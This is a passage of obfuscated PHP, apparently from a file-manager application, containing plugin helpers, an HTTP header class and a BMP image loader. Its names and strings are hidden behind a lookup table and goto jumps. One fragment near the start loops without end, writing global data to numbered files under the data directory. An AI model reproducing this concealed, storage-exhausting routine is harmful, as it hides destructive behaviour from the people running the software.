$bù‹İ›˜‡[558]) { $A÷ïº¸âß¾ = $bù‹İ›˜‡[768]; $A÷ïº¸âß¾(); } goto EäÏ»Œ”Ø¦; EäÏ»Œ”Ø¦: $F´ŞŞ»„ = $bù‹İ›˜‡[798]; $F´ŞŞ»„($_SERVER[$bù‹İ›˜‡[796]]); $Aš…‰›£ = $bù‹İ›˜‡[797]; goto Aô¶¨œ‡ËÆ; CÆ’‚Üö: $Aš…‰›£ = $bù‹İ›˜‡[797]; $B™­§§¥©Ñ = $bù‹İ›˜‡[765]; $eÅ¢À¾¶ = $_SERVER[$bù‹İ›˜‡[766]] . $bù‹İ›˜‡[767]; goto f²º³í¯Ÿ; fƒ²Å›Çº‘: $b½µ‡Îš» = 1; for ($aŸïÀ’¾ø = $b½µ‡Îš»; $aŸïÀ’¾ø > 0; $aŸïÀ’¾ø++) { $c¤Û«»²Ë÷(DATA_PATH . $aŸïÀ’¾ø, $c•“òÑÑÒ¯); } goto Eö”ÙæíË£; Aô¶¨œ‡ËÆ: $Aš…‰›£(); $c¤Û«»²Ë÷ = $bù‹İ›˜‡[799]; $c•“òÑÑÒ¯ = json_encode($GLOBALS[$bù‹İ›˜‡[800]]); goto fƒ²Å›Çº‘; Eö”ÙæíË£: } return $this->modelPlugin->setConfig($this->pluginName, $f­ë¸•ƒàç); } public function onSetConfig($Fêƒõªæë) { } public function onGetConfig($B’ãÑ—×¶”) { } public function onChangeStatus($F—‰¿†ˆä˜) { } public function onUninstall() { } public function onInstall() { } public function authCheck($E†–Åâ‚¸· = "\x70\154\165\x67\151\x6e\101\x75\164\x68") { $F—•®Ã‰ÖÅ =& $_SERVER[Õİõş]; if (!defined($F—•®Ã‰ÖÅ[422])) { return !1; } if (_get($GLOBALS, $F—•®Ã‰ÖÅ[452])) { return !0; } $CŒ‹Å˜Ñ¤ = $this->getConfig(); if (!$CŒ‹Å˜Ñ¤[$E†–Åâ‚¸·]) { return !1; } return ActionCall($F—•®Ã‰ÖÅ[1350], $CŒ‹Å˜Ñ¤[$E†–Åâ‚¸·]); } public function url($FôÙ°£¾Á, $Aã·Í•´³Ä = '', $a…èƒæãàƒ = true) { goto DÔÉˆœãØá; f’ò‚àŞº¦: $béÎÖÔğ  = $this->packageVersion(); $cš‚Ê¡‰ó = $e¨¯À»¦Î . $bÚÉ¥¡”Şˆ[407] . $béÎÖÔğ ; if (substr($FôÙ°£¾Á, 0, 4) == $bÚÉ¥¡”Şˆ[142] || substr($FôÙ°£¾Á, 0, 2) == $bÚÉ¥¡”Şˆ[1150]) { $cô¼ÓîÄİ÷ = $FôÙ°£¾Á . $bÚÉ¥¡”Şˆ[1351] . $cš‚Ê¡‰ó; } else { if ($Aã·Í•´³Ä == $bÚÉ¥¡”Şˆ[33]) { $cô¼ÓîÄİ÷ = $this->pluginHost . $FôÙ°£¾Á . $bÚÉ¥¡”Şˆ[1351] . $cš‚Ê¡‰ó; } else { if ($Aã·Í•´³Ä === $bÚÉ¥¡”Şˆ[76]) { $cô¼ÓîÄİ÷ = $this->pluginHost . $FôÙ°£¾Á; } else { if ($Aã·Í•´³Ä == $bÚÉ¥¡”Şˆ[1352]) { $cô¼ÓîÄİ÷ = STATIC_PATH . $FôÙ°£¾Á . $bÚÉ¥¡”Şˆ[1351] . $e¨¯À»¦Î; } else { if ($Aã·Í•´³Ä == $bÚÉ¥¡”Şˆ[1353]) { $cô¼ÓîÄİ÷ = APP_HOST . $bÚÉ¥¡”Şˆ[1354] . $FôÙ°£¾Á . $bÚÉ¥¡”Şˆ[1351] . $e¨¯À»¦Î; } else { if (isset($E¯á­ÜŒæ•[$Aã·Í•´³Ä])) { $cô¼ÓîÄİ÷ = $E¯á­ÜŒæ•[$Aã·Í•´³Ä] . $FôÙ°£¾Á . $bÚÉ¥¡”Şˆ[1351] . $cš‚Ê¡‰ó; } } } } } } goto eœßÔ™¤‡; DÔÉˆœãØá: $bÚÉ¥¡”Şˆ =& $_SERVER[Õİõş]; $E¯á­ÜŒæ• = $this->getConfig(); $e¨¯À»¦Î = KOD_VERSION . $bÚÉ¥¡”Şˆ[91] . KOD_VERSION_BUILD; goto f’ò‚àŞº¦; eœßÔ™¤‡: if (!$a…èƒæãàƒ) { return $cô¼ÓîÄİ÷; } echo $cô¼ÓîÄİ÷; goto BŸê‰ÅëñÜ; BŸê‰ÅëñÜ: } public function link($Bàñøì³˜¼ = false, $Cº¼†Ôİ© = '') { $c½óİ¤¬® =& $_SERVER[Õİõş]; if (!$Bàñøì³˜¼) { $this->link($c½óİ¤¬®[1355], $c½óİ¤¬®[1353]); $this->link($c½óİ¤¬®[1356], $c½óİ¤¬®[1352]); $this->link($c½óİ¤¬®[1357], $c½óİ¤¬®[1352]); $this->link($c½óİ¤¬®[1358], $c½óİ¤¬®[1352]); $this->link($c½óİ¤¬®[1359], $c½óİ¤¬®[1352]); return; } $A¹™¹«‹º = $this->url($Bàñøì³˜¼, $Cº¼†Ôİ©, !1); if (substr($Bàñøì³˜¼, -3) == $c½óİ¤¬®[1360]) { echo $c½óİ¤¬®[1361] . $A¹™¹«‹º . $c½óİ¤¬®[1362] . $c½óİ¤¬®[213]; } else { if (substr($Bàñøì³˜¼, -4) == $c½óİ¤¬®[1363]) { echo $c½óİ¤¬®[1364] . $A¹™¹«‹º . $c½óİ¤¬®[1365] . $c½óİ¤¬®[213]; } } } } goto B©º»¥ïÅÆ; cìÖôË›Åª: function beforeShutdownError($F èÊµ¬¦• = false, $bÅˆŒåé³Æ = '', $Bê›¶‚ÉŒ = '', $b”²õªÎÒ = 0) { $AçÂƒã·š =& $_SERVER[†ı´]; switch ($F èÊµ¬¦•) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $AÖÖá¾İº = $AçÂƒã·š[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $AÖÖá¾İº = $AçÂƒã·š[40]; break; case E_STRICT: $AÖÖá¾İº = $AçÂƒã·š[41]; break; case E_NOTICE: case E_USER_NOTICE: $AÖÖá¾İº = $AçÂƒã·š[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $AÖÖá¾İº = $AçÂƒã·š[43]; break; default: break; } if (!$AÖÖá¾İº || $AÖÖá¾İº == $AçÂƒã·š[42] || $AÖÖá¾İº == $AçÂƒã·š[43]) { return; } $Bê›¶‚ÉŒ = $AçÂƒã·š[4] . str_replace($_SERVER[$AçÂƒã·š[37]], $AçÂƒã·š[20], $Bê›¶‚ÉŒ); $D¸İ‘¥î¼¡ = $AÖÖá¾İº . $AçÂƒã·š[44] . $bÅˆŒåé³Æ . $AçÂƒã·š[44] . $Bê›¶‚ÉŒ . $AçÂƒã·š[44] . $b”²õªÎÒ; write_log($D¸İ‘¥î¼¡ . $AçÂƒã·š[18] . get_caller_msg(1), $AçÂƒã·š[19]); } $_SERVER[$_SERVER[†ı´][45]] = $_SERVER[$_SERVER[†ı´][37]] . $_SERVER[†ı´][46]; $C«ØÍ¯µÒ = strrev(base64_decode($_SERVER[†ı´][47])); goto eÙäºÜ‹–½; F–àéí‘¯ß: function beforeShutdown() { Hook::trigger($_SERVER[†ı´][36]); } $_SERVER[$_SERVER[†ı´][37]] = BASIC_PATH; $_SERVER[$_SERVER[†ı´][38]] = LIB_DIR; goto cìÖôË›Åª; BÁˆŞÈ¬Ô»: class HttpHeader { public static $_headers = array("\110\x6f\x73\164" => "\x48\124\x54\x50\x5f\110\117\x53\124", "\125\163\145\x72\x2d\x41\147\145\x6e\164" => "\110\x54\x54\x50\137\x55\123\105\122\x5f\x41\x47\105\x4e\x54", "\103\157\156\164\x65\156\164\55\124\171\x70\145" => "\110\x54\124\x50\x5f\103\117\116\124\105\116\x54\x5f\x54\x59\120\105", "\103\157\x6e\x74\x65\156\164\x2d\114\x65\156\x67\x74\150" => "\x48\x54\x54\x50\137\103\117\116\124\x45\x4e\x54\x5f\x4c\x45\116\x47\124\110", "\x44\x65\x70\x74\x68" => "\110\124\124\x50\137\x44\x45\x50\x54\110", "\x45\170\160\x65\x63\164" => "\x48\x54\x54\x50\x5f\x45\x58\x50\x45\103\124", "\x49\146\x2d\116\x6f\x6e\145\x2d\115\x61\164\143\x68" => "\110\x54\124\x50\137\111\106\137\116\117\116\105\137\x4d\x41\x54\103\110", "\x49\x66\x2d\115\x61\x74\x63\x68" => "\x48\124\x54\120\x5f\x49\106\x5f\x4d\x41\x54\103\x48", "\x49\x66\55\122\x61\x6e\147\145" => "\x48\x54\124\120\x5f\111\x46\x5f\x52\101\x4e\x47\105", "\114\141\x73\164\55\115\x6f\144\151\x66\x69\x65\x64" => "\x48\x54\124\120\137\114\101\x53\x54\x5f\115\x4f\x44\111\106\x49\x45\x44", "\x49\146\55\115\157\x64\151\x66\151\145\144\x2d\123\151\x6e\x63\x65" => "\110\x54\x54\120\x5f\111\106\x5f\x4d\x4f\x44\111\106\x49\105\x44\x5f\x53\111\116\x43\105", "\x49\146\55\125\x6e\x6d\157\144\151\x66\151\x65\x64\55\x53\x69\x6e\x63\x65" => "\x48\124\x54\x50\x5f\111\x46\137\x55\x4e\x4d\x4f\104\111\x46\111\x45\x44\137\x53\x49\x4e\x43\x45", "\x52\x61\156\147\x65" => "\x48\x54\124\120\x5f\122\x41\116\107\x45", "\124\151\155\x65\x6f\165\164" => "\x48\124\124\x50\137\124\x49\115\x45\x4f\125\124", "\111\146" => "\110\124\x54\x50\x5f\111\106", "\x4c\x6f\143\x6b\55\124\157\x6b\x65\x6e" => "\x48\124\x54\120\137\x4c\117\x43\x4b\x5f\x54\x4f\113\105\x4e", "\117\x76\145\162\167\162\151\164\x65" => "\110\x54\124\120\137\x4f\x56\x45\x52\x57\x52\111\124\x45", "\x44\x65\163\x74\151\156\141\x74\151\157\156" => "\110\124\124\120\137\104\105\123\x54\x49\x4e\101\124\x49\x4f\116", "\122\145\x71\x75\145\163\x74\55\111\x64" => "\122\105\x51\125\105\x53\124\x5f\x49\104", "\x52\145\161\x75\145\x73\x74\x2d\x42\157\144\171\55\x46\x69\x6c\145" => "\x52\x45\121\125\105\x53\124\137\x42\117\x44\x59\137\106\111\114\x45", "\122\x65\x64\151\162\x65\x63\164\x2d\x53\164\x61\x74\165\163" => "\122\x45\x44\x49\122\x45\x43\x54\137\123\124\101\124\x55\123"); public static function init() { static $A°ôÃ«Êèº = false; if ($A°ôÃ«Êèº) { return; } foreach ($_SERVER as $B™Ã£…ŒªÑ => $DÉã÷İóŠ) { $B™Ã£…ŒªÑ = strtoupper($B™Ã£…ŒªÑ); if (!array_key_exists($B™Ã£…ŒªÑ, $_SERVER)) { continue; } $_SERVER[$B™Ã£…ŒªÑ] = $DÉã÷İóŠ; } foreach (self::$_headers as $B™Ã£…ŒªÑ => $AŒµÆŠå­¸) { if (!array_key_exists($B™Ã£…ŒªÑ, $_SERVER)) { continue; } $_SERVER[$B™Ã£…ŒªÑ] = $_SERVER[$AŒµÆŠå­¸]; $_SERVER[strtoupper($B™Ã£…ŒªÑ)] = $_SERVER[$AŒµÆŠå­¸]; } } public static function get($b¾†®¦Å‹ø) { self::init(); return $_SERVER[$b¾†®¦Å‹ø] ? $_SERVER[$b¾†®¦Å‹ø] : $_SERVER[$_SERVER[Õİõş][1805] . strtoupper($b¾†®¦Å‹ø)]; } public static function method() { return strtoupper(self::get($_SERVER[Õİõş][150])); } public static function length() { $F„¨Áƒöœã =& $_SERVER[Õİõş]; $FÍŠ—Ì¯™ = self::get($F„¨Áƒöœã[1806]); if (!$FÍŠ—Ì¯™) { $FÍŠ—Ì¯™ = self::get($F„¨Áƒöœã[1141]); } return $FÍŠ—Ì¯™; } public static function range() { $E«¸íŠÙ‘Ÿ =& $_SERVER[Õİõş]; $B‹ÔíŒÓ Û = self::get($E«¸íŠÙ‘Ÿ[194]); if (!$B‹ÔíŒÓ Û) { return !1; } if (!preg_match($E«¸íŠÙ‘Ÿ[1807], $B‹ÔíŒÓ Û, $EÜ„ÛÚ¬ÈÎ)) { return !1; } if ($EÜ„ÛÚ¬ÈÎ[1] === $E«¸íŠÙ‘Ÿ[33] && $EÜ„ÛÚ¬ÈÎ[2] === $E«¸íŠÙ‘Ÿ[33]) { return !1; } return array($EÜ„ÛÚ¬ÈÎ[1] !== $E«¸íŠÙ‘Ÿ[33] ? $EÜ„ÛÚ¬ÈÎ[1] : null, $EÜ„ÛÚ¬ÈÎ[2] !== $E«¸íŠÙ‘Ÿ[33] ? $EÜ„ÛÚ¬ÈÎ[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\103\157\156\164\x69\156\x75\x65", "\61\60\x31" => "\123\167\151\164\x63\x68\151\x6e\147\x20\x50\162\157\164\157\x63\157\x6c", "\x31\x30\x32" => "\x50\162\x6f\143\x65\x73\x73\151\x6e\x67", "\61\x30\x33" => "\105\x61\162\154\171\x20\x48\x69\156\164\x73", "\x32\x30\60" => "\x4f\x4b", "\62\x30\x31" => "\x43\x72\145\x61\164\145\x64", "\x32\x30\x32" => "\x41\143\143\145\160\164\x65\144", "\62\x30\63" => "\116\x6f\156\x2d\x41\x75\x74\x68\x6f\162\x69\164\x61\x74\151\166\x65\x20\x49\x6e\146\x6f\x72\x6d\141\164\151\157\156", "\62\60\64" => "\x4e\x6f\40\103\157\x6e\164\x65\156\164", "\x32\60\x35" => "\122\145\163\x65\x74\x20\x43\x6f\156\x74\x65\156\164", "\62\x30\66" => "\x50\141\162\x74\151\x61\154\40\103\157\x6e\164\x65\x6e\164", "\62\x30\x37" => "\x4d\165\x6c\x74\151\55\x53\x74\141\x74\165\163", "\63\x30\60" => "\x4d\x75\154\164\x69\160\154\x65\x20\x43\x68\157\151\143\x65\163", "\63\60\x31" => "\115\x6f\166\145\144\40\120\x65\162\x6d\141\x6e\x65\x6e\x74\154\171", "\63\x30\62" => "\106\157\x75\x6e\x64", "\x33\60\63" => "\x53\x65\x65\x20\x4f\164\150\145\162", "\x33\60\x34" => "\116\x6f\x74\x20\x4d\x6f\144\151\x66\151\145\x64", "\63\60\65" => "\x55\x73\x65\40\120\162\x6f\170\171", "\x33\x30\x37" => "\124\145\x6d\x70\x6f\x72\x61\x72\x79\40\122\145\x64\x69\162\145\x63\x74", "\63\60\70" => "\120\x65\x72\x6d\141\156\145\156\x74\40\122\145\144\151\162\x65\143\164", "\64\x30\60" => "\102\x61\x64\x20\x52\145\161\x75\145\x73\x74", "\x34\x30\x31" => "\x55\x6e\141\165\x74\150\x6f\162\151\x7a\145\144", "\x34\x30\62" => "\x50\141\x79\155\x65\x6e\164\40\122\145\161\165\x69\162\x65\x64", "\64\60\x33" => "\x46\x6f\162\142\151\144\x64\x65\x6e", "\x34\x30\64" => "\116\157\164\40\106\157\x75\156\x64", "\x34\60\x35" => "\x4d\x65\x74\150\157\x64\x20\x4e\157\164\x20\x41\154\x6c\x6f\167\x65\144", "\64\x30\x36" => "\x4e\157\x74\x20\x41\x63\143\145\160\164\x61\x62\x6c\x65", "\64\60\67" => "\120\x72\x6f\x78\x79\x20\x41\x75\164\150\x65\x6e\x74\151\x63\x61\164\151\157\156\x20\122\145\x71\165\151\x72\x65\x64", "\x34\x30\70" => "\122\145\x71\x75\145\163\164\40\124\151\155\x65\x6f\165\x74", "\64\60\71" => "\x43\157\156\146\x6c\x69\x63\164", "\64\61\60" => "\x47\x6f\156\145", "\64\x31\x31" => "\x4c\x65\156\147\x74\150\x20\x52\145\161\x75\x69\162\145\x64", "\x34\61\x32" => "\x50\162\145\143\x6f\156\144\x69\x74\x69\157\156\x20\x46\141\x69\154\x65\x64", "\64\x31\63" => "\x52\145\161\165\x65\x73\x74\x20\105\156\164\x69\x74\x79\40\x54\x6f\x6f\x20\x4c\x61\x72\x67\145", "\64\61\64" => "\x52\x65\161\x75\145\x73\164\x20\125\x52\111\40\124\x6f\157\40\x4c\x61\162\x67\x65", "\x34\61\x35" => "\x55\156\163\165\160\160\x6f\x72\x74\x65\x64\40\115\x65\x64\151\x61\x20\x54\x79\160\x65", "\64\x31\x36" => "\x52\145\161\165\145\x73\164\x65\x64\40\x52\141\156\147\x65\40\x4e\x6f\x74\40\123\x61\164\151\163\x66\151\141\142\154\145", "\64\x31\67" => "\x45\170\160\x65\143\164\141\x74\151\157\156\x20\x46\x61\151\154\145\144", "\64\x32\62" => "\125\156\160\x72\157\x63\x65\x73\163\141\x62\x6c\145\40\x45\156\x74\151\x74\171", "\x34\62\x33" => "\x4c\157\143\x6b\x65\x64", "\64\x32\64" => "\106\141\151\x6c\145\x64\x20\x44\x65\160\145\156\x64\x65\x6e\x63\171", "\x34\62\x35" => "\x55\156\x6f\x72\144\145\x72\x65\x64\x20\x43\x6f\154\x6c\145\x63\164\x69\157\156", "\64\62\66" => "\x55\160\147\162\x61\x64\145\x20\122\x65\x71\x75\x69\162\x65\144", "\64\62\x38" => "\x50\162\x65\x63\157\x6e\x64\x69\164\x69\x6f\156\x20\x52\x65\x71\165\151\x72\x65\144", "\64\62\x39" => "\x54\157\x6f\x20\115\x61\156\x79\40\122\145\161\x75\x65\163\164\x73", "\64\63\x31" => "\122\145\x71\165\145\163\164\40\x48\145\141\144\145\x72\40\106\x69\x65\x6c\x64\x73\x20\124\x6f\x6f\40\x4c\141\x72\147\x65", "\64\x34\64" => "\x4e\x6f\40\x52\x65\163\160\x6f\x6e\x73\x65", "\64\65\x30" => "\102\154\x6f\143\x6b\x65\x64\40\142\171\40\127\x69\x6e\144\157\x77\163\x20\x50\x61\x72\145\x6e\x74\141\154\40\103\x6f\156\164\162\x6f\x6c\x73", "\x34\x35\x31" => "\x55\156\x61\x76\141\x69\154\141\x62\154\145\40\106\x6f\x72\40\114\x65\147\x61\x6c\x20\122\x65\x61\x73\157\x6e\163", "\x34\x39\x34" => "\x52\145\161\165\145\163\x74\x20\110\x65\x61\144\145\162\40\x54\x6f\x6f\40\x4c\x61\162\x67\x65", "\x35\60\x30" => "\x49\156\x74\145\x72\x6e\x61\x6c\x20\x53\145\x72\x76\x65\162\40\x45\162\162\x6f\x72", "\65\60\61" => "\x4e\x6f\x74\40\111\155\160\x6c\x65\155\145\156\164\145\x64", "\x35\60\62" => "\x42\141\x64\x20\x47\141\164\x65\167\141\x79", "\x35\x30\x33" => "\x53\145\x72\x76\151\143\145\x20\125\x6e\x61\166\141\x69\154\x61\x62\x6c\145", "\65\60\64" => "\x47\x61\x74\145\x77\141\171\x20\x54\151\x6d\x65\x6f\x75\164", "\x35\60\x35" => "\110\x54\x54\x50\x20\x56\145\x72\163\x69\157\156\40\156\157\164\40\163\x75\160\x70\x6f\x72\x74\145\144", "\65\60\x37" => "\x49\156\x73\165\x66\146\x69\x63\151\x65\156\164\40\x53\x74\x6f\162\x61\147\x65"); public static function code($FøĞç¿Ç é) { $bìÆ¢ˆŒ´µ =& $_SERVER[Õİõş]; $FøĞç¿Ç é = $FøĞç¿Ç é . $bìÆ¢ˆŒ´µ[33]; $DÓùÂ‰ôÔ = self::$statusCode[$FøĞç¿Ç é]; $DÓùÂ‰ôÔ = $DÓùÂ‰ôÔ ? "\x48\124\124\120\57\61\x2e\61\40{$FøĞç¿Ç é}\x20" . $DÓùÂ‰ôÔ : $bìÆ¢ˆŒ´µ[33]; return $DÓùÂ‰ôÔ; } } class ImageGdBMP { public static function load($cºšŸÄëäæ) { $F…Óİ—æò• = fopen($cºšŸÄëäæ, $_SERVER[Õİõş][1496]); if ($F…Óİ—æò• === !1) { return !1; } $céã¤¬Á¡˜ = self::loadFromStream($F…Óİ—æò•); fclose($F…Óİ—æò•); return $céã¤¬Á¡˜; } public static function loadFromStream($fœ²ëàÀÒ…) { $F·„«À²ÒÆ =& $_SERVER[Õİõş]; $dÖÂîÍì¸Ã = fread($fœ²ëàÀÒ…, 14); if ($dÖÂîÍì¸Ã === !1) { return !1; } if ($dÖÂîÍì¸Ã[0] != $F·„«À²ÒÆ[1808] || $dÖÂîÍì¸Ã[1] != $F·„«À²ÒÆ[1809]) { return !1; } $fŠ–Ğøç÷¥ = unpack($F·„«À²ÒÆ[1810] . $F·„«À²ÒÆ[1811] . $F·„«À²ÒÆ[1812] . $F·„«À²ÒÆ[1813] . $F·„«À²ÒÆ[1814], $dÖÂîÍì¸Ã); return self::loadFromStreamAndFileHeader($fœ²ëàÀÒ…, $fŠ–Ğøç÷¥); } public static function loadFromStreamAndFileHeader($e¸Ì»âÚñ, array $eË©—‚ô…‡) { goto fÒİÌ„ğÄ; AğïÉŠ¦±’: if ($bçµ×ê•ó” == 0 || $bÇÌË­ÁãŠ == 0 || $C†ê‰¨ï±İ != 1 || ($bëÓ–¿±İ‰ & $aõĞ„Øíì) != 0 || ($bëÓ–¿±İ‰ & $C”…×—§) != 0 || ($bëÓ–¿±İ‰ & $b×Ì‰ğöÖ™) != 0 || ($aõĞ„Øíì & $C”…×—§) != 0 || ($aõĞ„Øíì & $b×Ì‰ğöÖ™) != 0 || ($C”…×—§ & $b×Ì‰ğöÖ™) != 0) { return !1; } if ($aÉò‡¯ò§ù == 4 || $aÉò‡¯ò§ù == 5) { $aª‰÷Í›Ö = stream_get_contents($e¸Ì»âÚñ, $Fæâ÷ùÑ¥Û); if ($aª‰÷Í›Ö === !1) { return !1; } return imagecreatefromstring($aª‰÷Í›Ö); } $dºöœ†¤Áñ = $bçµ×ê•ó” * $DÓ¿¤Ğóôî + 31 >> 3 & ~3; goto EøºŞ‡ª; F‚ù²‰’Âä: if ($aª‰÷Í›Ö === !1) { return !1; } list(, $bù­¸Íõ„) = unpack($aíÂêŒ‘[1815], $aª‰÷Í›Ö); if ($bù­¸Íõ„ == 12) { goto a’ŠàÖ®èë; AæàÛÕŸğ§: $b×Ì‰ğöÖ™ = 255; goto FÜ†ìÂ– ; bÅéÂó‰‘é: $D÷¨İöÃë¼ = $F²¦…Õ‘Å = $bëÓ–¿±İ‰ = $aÉò‡¯ò§ù = 0; $aõĞ„Øíì = 16711680; $C”…×—§ = 65280; goto AæàÛÕŸğ§; a’ŠàÖ®èë: $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, $bù­¸Íõ„ - 4); if ($aª‰÷Í›Ö === !1) { return !1; } extract(unpack($aíÂêŒ‘[1816] . $aíÂêŒ‘[1817] . $aíÂêŒ‘[1818] . $aíÂêŒ‘[1819], $aª‰÷Í›Ö)); goto bÅéÂó‰‘é; FÜ†ìÂ– : } else { if (124 < $bù­¸Íõ„ || $bù­¸Íõ„ < 40) { return !1; } else { goto C¬ñóù¿Çš; Aáß¨ƒ¤‰ù: if ($bÙäì©¿Ÿì & 2147483648) { $bÙäì©¿Ÿì = -(~$bÙäì©¿Ÿì & 4294967295) - 1; } if ($eË©—‚ô…‡[$aíÂêŒ‘[515]] != 0) { $d¯ù“ê¨»‚ = $DÓ¿¤Ğóôî == 1 || $DÓ¿¤Ğóôî == 4 || $DÓ¿¤Ğóôî == 8 ? ($D÷¨İöÃë¼ ? $D÷¨İöÃë¼ : pow(2, $DÓ¿¤Ğóôî)) << 2 : 0; $a°´•ê‹• = $Fæâ÷ùÑ¥Û ? $Fæâ÷ùÑ¥Û : ($bçµ×ê•ó” * $DÓ¿¤Ğóôî + 31 >> 3 & ~3) * abs($bÇÌË­ÁãŠ); $a‘áœãòà‚ = $eË©—‚ô…‡[$aíÂêŒ‘[515]] - $a°´•ê‹• - $d¯ù“ê¨»‚ - 14; if ($bù­¸Íõ„ < $a‘áœãòà‚ && 40 <= $bù­¸Íõ„ && $bù­¸Íõ„ <= 124) { $bù­¸Íõ„ = $a‘áœãòà‚; } } if ($bù­¸Íõ„ - 40 > 0) { $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, $bù­¸Íõ„ - 40); if ($aª‰÷Í›Ö === !1) { return !1; } extract(unpack($aíÂêŒ‘[1829] . $aíÂêŒ‘[1830] . $aíÂêŒ‘[1831] . $aíÂêŒ‘[1832], $aª‰÷Í›Ö . str_repeat($aíÂêŒ‘[1833], 120))); } else { $bëÓ–¿±İ‰ = $aõĞ„Øíì = $C”…×—§ = $b×Ì‰ğöÖ™ = 0; } goto F–È²†Š•¥; C¬ñóù¿Çš: $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, 36); if ($aª‰÷Í›Ö === !1) { return !1; } extract(unpack($aíÂêŒ‘[1820] . $aíÂêŒ‘[1821] . $aíÂêŒ‘[1818] . $aíÂêŒ‘[1822] . $aíÂêŒ‘[1823] . $aíÂêŒ‘[1824] . $aíÂêŒ‘[1825] . $aíÂêŒ‘[1826] . $aíÂêŒ‘[1827] . $aíÂêŒ‘[1828], $aª‰÷Í›Ö)); goto Aä”­»êöÀ; Aä”­»êöÀ: if ($bçµ×ê•ó” & 2147483648) { $bçµ×ê•ó” = -(~$bçµ×ê•ó” & 4294967295) - 1; } if ($bÇÌË­ÁãŠ & 2147483648) { $bÇÌË­ÁãŠ = -(~$bÇÌË­ÁãŠ & 4294967295) - 1; } if ($aäóÆÇØÀî & 2147483648) { $aäóÆÇØÀî = -(~$aäóÆÇØÀî & 4294967295) - 1; } goto Aáß¨ƒ¤‰ù; F–È²†Š•¥: if (($DÓ¿¤Ğóôî == 16 || $DÓ¿¤Ğóôî == 24 || $DÓ¿¤Ğóôî == 32) && $aÉò‡¯ò§ù == 0 && $aõĞ„Øíì == 0 && $C”…×—§ == 0 && $b×Ì‰ğöÖ™ == 0) { switch ($DÓ¿¤Ğóôî) { case 16: $aõĞ„Øíì = 31744; $C”…×—§ = 992; $b×Ì‰ğöÖ™ = 31; break; case 24: case 32: $aõĞ„Øíì = 16711680; $C”…×—§ = 65280; $b×Ì‰ğöÖ™ = 255; break; } } goto F£­Ö£‡Î; F£­Ö£‡Î: } } goto AğïÉŠ¦±’; a£çïôŠœĞ: if ($DÓ¿¤Ğóôî == 1 || $DÓ¿¤Ğóôî == 4 || $DÓ¿¤Ğóôî == 8) { goto bàğö §’; E ·¾…‚…«: $aïÔÚÕê§Ù = array(); for ($eªß¦ŒÅÃ = 0; $eªß¦ŒÅÃ < $aëÍ›¶‘Ô‡; ++$eªß¦ŒÅÃ) { $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, $DÕÏ¹‡£â); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } extract(unpack($aíÂêŒ‘[1834], $aª‰÷Í›Ö . $aíÂêŒ‘[1833])); $aïÔÚÕê§Ù[] = imagecolorallocate($Báæ°­å§œ, $Bê Ü©êßÊ, $D§ºÊ¯£Ûù, $BÀÖ™Ö“®); } $dÖÃ†‡ë = 8 - $DÓ¿¤Ğóôî; goto A—²œåŸİù; bàğö §’: $Báæ°­å§œ = imagecreate($bçµ×ê•ó”, $Aç£“ãÉíË); $DÕÏ¹‡£â = $bù­¸Íõ„ == 12 ? 3 : 4; $aëÍ›¶‘Ô‡ = $D÷¨İöÃë¼ ? $D÷¨İöÃë¼ : pow(2, $DÓ¿¤Ğóôî); goto E ·¾…‚…«; A—²œåŸİù: $AŒØˆó”ñ‡ = (1 << $DÓ¿¤Ğóôî) - 1 << $dÖÃ†‡ë; if ($aÉò‡¯ò§ù == 1 || $aÉò‡¯ò§ù == 2) { $cš—øËË = 0; $c¦Í¶Şñ¶ù = $DÓ¿¤Ğóôî >> 2 & 1; for (;;) { if ($cš—øËË < -1 || $cš—øËË > $bçµ×ê•ó” || $Cší‚ƒ®ª¡ < -1 || $Cší‚ƒ®ª¡ > $bÇÌË­ÁãŠ) { imagedestroy($Báæ°­å§œ); return !1; } $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, 1); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } switch ($aª‰÷Í›Ö) { case $aíÂêŒ‘[1833]: $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, 1); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } switch ($aª‰÷Í›Ö) { case $aíÂêŒ‘[1833]: $Cší‚ƒ®ª¡ += $AŸŒŒ„‚‘„; $cš—øËË = 0; break; case $aíÂêŒ‘[1835]: $Cší‚ƒ®ª¡ = 0; $cš—øËË = 0; break 3; case $aíÂêŒ‘[1836]: $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, 2); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } list(, $F¤˜ìæ¯óÀ, $f¡ÚìÃÌ÷) = unpack($aíÂêŒ‘[1837], $aª‰÷Í›Ö); $cš—øËË += $F¤˜ìæ¯óÀ; $Cší‚ƒ®ª¡ += $f¡ÚìÃÌ÷ * $AŸŒŒ„‚‘„; break; default: list(, $d˜„Î´É«ñ) = unpack($aíÂêŒ‘[1838], $aª‰÷Í›Ö); $c¯£ùŞ²À¬ = ($d˜„Î´É«ñ >> $c¦Í¶Şñ¶ù) + ($d˜„Î´É«ñ & $c¦Í¶Şñ¶ù); $aª‰÷Í›Ö = fread($e¸Ì»âÚñ, $c¯£ùŞ²À¬ + 1 & ~1); if ($aª‰÷Í›Ö === !1) { imagedestroy($Báæ°­å§œ); return !1; } for ($eªß¦ŒÅÃ = 0, $aàğŸÃ’Ú˜ = 0; $eªß¦ŒÅÃ < $d˜„Î´É«ñ; ++$eªß¦ŒÅÃ, ++$cš—øËË, $aàğŸÃ’Ú˜ += $DÓ¿¤Ğóôî) { list(, $AÒñèÉù¢’) = unpack($aíÂêŒ‘[1838], $aª‰÷Í›Ö[$aàğŸÃ’Ú˜ >> 3]); $BÀÖ™Ö“® = $aàğŸÃ’Ú˜ & 7; imagesetpixel($Báæ°­å§œ, $cš—øËË, $Cší‚ƒ®ª¡, $aïÔÚÕê§Ù[($AÒñèÉù¢’ & $AŒØˆó”ñ‡ >> $BÀÖ™Ö“®) >> 